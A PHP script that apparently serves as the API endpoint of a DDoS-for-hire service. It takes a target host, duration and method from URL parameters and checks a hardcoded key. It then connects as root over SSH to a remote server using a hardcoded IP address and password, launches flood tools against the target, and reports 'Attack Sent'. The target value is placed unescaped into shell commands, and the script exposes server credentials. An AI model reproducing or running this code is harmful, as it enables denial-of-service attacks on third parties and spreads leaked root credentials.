<?php
error_reporting(E_ALL);
ini_set('display_errors', '1');

if(isset($_GET['host'], $_GET['port'], $_GET['time'], $_GET['method'], $_GET['key'])) {
    $host = $_GET['host'];
    $port = $_GET['port'];
    $time = $_GET['time'];
    $method = $_GET['method'];
    $key = $_GET['key'];

    $username = 'root';
    $ip = '142.93.138.93';
    $ports = '22';
    $password = '123@Family';

    $allowedKeys = ['CELLOAPIC2'];

    if(!in_array($key, $allowedKeys)) {
        die("Invalid Key");
    }

    switch ($method) {
        case 'MIX':
            $command = "cd /root/ && screen -dm ./MIX $host $time 64 5";
            break;
        case 'FLOODS':
            $command = "cd /root/ && screen -dm ./sqflood GET $host $time 5 64 proxy.txt";
            break;
        case 'TLS2':
            $command = "cd /root/ && screen -dm node tls2 $host $time 64 5 proxy.txt";
            break;
        case 'REFRESH':
            $command = "cd /root/ && pkill screen";
            break;
        case 'UPDATE':
            $command = "cd /root/ && screen -dm bash autoUpdate.sh && cd /root/ && apt update -y && apt upgarde -y";
            break;
        default:
            die("Unknown method");
    }

    if(!function_exists("ssh2_connect")) {
        die("function ssh2_connect doesn't exist");
    }

    if(!($con = ssh2_connect($ip, $ports))){
        die("Invalid Vps Ip Or Vps Port.");
    }

    if(!ssh2_auth_password($con, $username, $password)) {
        die("Invalid Vps Password Or Username.");
    }

    $shell = ssh2_shell($con, 'vt100', null, 80, 40, SSH2_TERM_UNIT_CHARS);
    if(!$shell) {
        die("Unable to establish shell.");
    }

    fwrite($shell, $command . PHP_EOL);
    sleep(2);
    $data = '';
    while($buffer = fread($shell, 4096)) {
        $data .= $buffer;
    }
    fclose($shell);

    if(empty($data)) {
        echo "No output received.";
    } else {
        echo "Attack Sent To $host using $method Methods";
    }
} else {
    echo "The contents of his Parameter are like this: http://$ip/?host=&port=&time=&method=&key=";
}
?>
